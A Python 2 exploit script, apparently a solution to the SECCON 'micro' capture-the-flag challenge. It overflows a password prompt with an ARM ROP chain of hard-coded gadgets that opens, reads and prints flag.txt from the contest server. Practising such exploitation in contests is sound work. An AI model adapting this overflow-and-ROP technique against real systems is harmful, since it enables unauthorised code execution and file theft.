#!/usr/bin/python
import struct
import socket
import telnetlib
def readuntil(f, delim='\n'):
    data = ''
    while not data.endswith(delim):
        data += f.read(1)
    return data
def p(v):
    return struct.pack('<I', v)
def u(v):
    return struct.unpack('<I', v)[0]
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('micro.pwn.seccon.jp', 10001))
f = s.makefile('rw', bufsize=0)
print readuntil(f, 'Input password: ');
flag_txt_addr = 0x4355
pop_r4_r5_r6_pc = 0x4220
mov_r0_r4_pop_r4_r5_r6_pc = 0x421c
ldmfd = 0x42b0
syscall_ret = 0x404c
printout = 0x42ec
rop = 'A' * 28
rop += p(pop_r4_r5_r6_pc)
rop += p(0x5) # r4 -> open
rop += p(0x41414141) * 2
rop += p(mov_r0_r4_pop_r4_r5_r6_pc) # pc
rop += p(0x41414141) * 3
rop += p(ldmfd) # pc
rop += p(flag_txt_addr) # r1 'flag.txt' addr
rop += p(0x0) # r2 flags
rop += p(0x0) # r3 mode
rop += p(0x41414141) * 4 # r4 - r6, r11
rop += p(syscall_ret)
rop += p(pop_r4_r5_r6_pc)
rop += p(0x3) # r4 -> read
rop += p(0x41414141) * 2
rop += p(mov_r0_r4_pop_r4_r5_r6_pc) # pc
rop += p(0x41414141) * 3
rop += p(ldmfd) # pc
rop += p(0x3) # fd
rop += p(0x1fff0000) # buffer
rop += p(1000) # count
rop += p(0x41414141) * 4 # r4 - r6, r11
rop += p(syscall_ret)
rop += p(pop_r4_r5_r6_pc)
rop += p(0x4) # r4 -> write
rop += p(0x41414141) * 2
rop += p(mov_r0_r4_pop_r4_r5_r6_pc) # pc
rop += p(0x41414141) * 3
rop += p(ldmfd) # pc
rop += p(0x1) # fd
rop += p(0x1fff0000) # buffer
rop += p(1000) # count
rop += p(0x41414141) * 4 # r4 - r6, r11
rop += p(syscall_ret)
f.write(rop + '\n')
print (f.read(1024))
